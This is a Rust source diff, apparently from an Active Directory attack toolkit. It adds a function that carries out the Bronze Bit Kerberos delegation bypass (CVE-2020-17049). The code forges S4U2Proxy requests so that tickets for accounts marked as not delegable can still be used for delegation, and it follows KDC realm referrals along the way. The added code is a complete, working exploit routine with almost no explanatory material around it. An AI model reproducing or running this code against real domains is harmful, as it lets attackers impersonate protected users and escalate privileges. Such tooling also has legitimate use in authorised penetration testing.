@@ -347,7 +347,7 @@ fn build_pa_enc_timestamp(key: &[u8], etype: i32) -> Result<PaData> {
 }
 
 /// Build Authenticator encrypted with session key for AP-REQ
-pub(crate) fn build_encrypted_authenticator(
+pub fn build_encrypted_authenticator(
     realm: &str,
     cname: &str,
     session_key: &[u8],
@@ -384,7 +384,7 @@ pub(crate) fn build_encrypted_authenticator(
 }
 
 /// Build AP-REQ wrapping a ticket + encrypted authenticator
-pub(crate) fn build_ap_req(ticket: &Ticket, encrypted_auth: EncryptedData) -> ApReq {
+pub fn build_ap_req(ticket: &Ticket, encrypted_auth: EncryptedData) -> ApReq {
     ApReq {
         pvno: 5,
         msg_type: 14,
@@ -1597,6 +1597,131 @@ pub async fn s4u2proxy(
 
     Err(OverthroneError::Kerberos(
         "S4U2Proxy: referral loop exhausted".to_string(),
+    ))
+}
+
+/// S4U2Proxy with Bronze Bit (CVE-2020-17049) forwardable flag bypass.
+///
+/// Bronze Bit allows services with `TrustedToAuthForDelegation` to bypass the
+/// "Sensitive and cannot be delegated" restriction. The KDC fails to check whether
+/// the forwarded ticket has the FORWARDABLE flag set, so even non-forwardable
+/// S4U2Self tickets can be used for delegation.
+///
+/// This function wraps `s4u2proxy` with optional PA-PAC-OPTIONS for explicit
+/// proxy request flagging.
+pub async fn s4u2proxy_bronzebit(
+    dc_ip: &str,
+    tgt: &TicketGrantingData,
+    s4u2self_ticket: &TicketGrantingData,
+    target_spn: &str,
+    use_pac_options: bool,
+) -> Result<TicketGrantingData> {
+    info!(
+        "BronzeBit S4U2Proxy: {target_spn} as {} (CVE-2020-17049)",
+        s4u2self_ticket.client_principal
+    );
+
+    let realm = &tgt.client_realm;
+    let spn_parts: Vec<&str> = target_spn.splitn(2, '/').collect();
+    let sname = PrincipalName {
+        name_type: NT_SRV_INST,
+        name_string: spn_parts.iter().map(|s| s.to_string()).collect(),
+    };
+
+    let encrypted_auth = build_encrypted_authenticator(
+        realm,
+        &tgt.client_principal,
+        &tgt.session_key,
+        tgt.session_key_etype,
+    )?;
+    let ap_req = build_ap_req(&tgt.ticket, encrypted_auth);
+
+    let mut current_dc = dc_ip.to_string();
+    let mut current_realm = realm.clone();
+
+    for hop in 0..=2 {
+        let req_body = build_tgs_req_body(
+            &current_realm,
+            sname.clone(),
+            &[tgt.session_key_etype],
+            KDC_OPT_FORWARDABLE | KDC_OPT_CANONICALIZE | KDC_OPT_CNAME_IN_ADDL_TKT,
+            Some(vec![s4u2self_ticket.ticket.clone()]),
+            Some(PrincipalName {
+                name_type: NT_PRINCIPAL,
+                name_string: vec![tgt.client_principal.clone()],
+            }),
+        );
+
+        let mut padata = vec![PaData {
+            padata_type: PA_TGS_REQ,
+            padata_value: ap_req.build(),
+        }];
+
+        // Optionally add PA-PAC-OPTIONS with proxy flags
+        if use_pac_options {
+            let pac_opts = build_pa_pac_options(0x00000001); // PAC_OPTIONS_FLAG_PROXY
+            padata.push(pac_opts);
+        }
+
+        let tgs_req = TgsReq {
+            pvno: 5,
+            msg_type: 12,
+            padata: Some(padata),
+            req_body,
+        };
+
+        let response_bytes = kdc_exchange(&current_dc, &tgs_req.build()).await?;
+
+        match TgsRep::parse(&response_bytes) {
+            Ok((_, tgs_rep)) => {
+                let tgt_cipher = new_kerberos_cipher(tgt.session_key_etype)
+                    .map_err(|e| OverthroneError::Kerberos(format!("Cipher: {e}")))?;
+
+                let decrypted = tgt_cipher
+                    .decrypt(&tgt.session_key, 8, &tgs_rep.enc_part.cipher)
+                    .map_err(|e| OverthroneError::Kerberos(format!("BronzeBit decrypt: {e}")))?;
+
+                let (_, enc_tgs) = EncTgsRepPart::parse(&decrypted)
+                    .map_err(|e| OverthroneError::Kerberos(format!("Parse: {e}")))?;
+
+                info!("BronzeBit S4U2Proxy ticket for {target_spn} obtained");
+                return Ok(TicketGrantingData {
+                    ticket: tgs_rep.ticket,
+                    session_key: enc_tgs.key.keyvalue,
+                    session_key_etype: enc_tgs.key.keytype,
+                    client_principal: s4u2self_ticket.client_principal.clone(),
+                    client_realm: current_realm,
+                    end_time: Some(enc_tgs.endtime),
+                });
+            }
+            Err(_) => {
+                if let Some(suggested) = extract_wrong_realm(&response_bytes) {
+                    if hop >= 2 {
+                        return Err(OverthroneError::Kerberos(format!(
+                            "BronzeBit: exceeded max referral hops (referred to '{suggested}')"
+                        )));
+                    }
+                    info!("BronzeBit: KDC referred to realm '{suggested}' (hop {hop})");
+                    match resolve_realm_kdc(&suggested).await {
+                        Ok(new_dc) => {
+                            current_dc = new_dc;
+                            current_realm = suggested;
+                            continue;
+                        }
+                        Err(e) => {
+                            return Err(OverthroneError::Kerberos(format!(
+                                "BronzeBit: referred to '{suggested}' but DNS SRV resolution failed: {e}"
+                            )));
+                        }
+                    }
+                }
+                return Err(parse_krb_error(&response_bytes));
+            }
+        }
+    }
+
+    Err(OverthroneError::Kerberos(
+        "BronzeBit: referral loop exhausted".to_string(),
     ))
 }
 
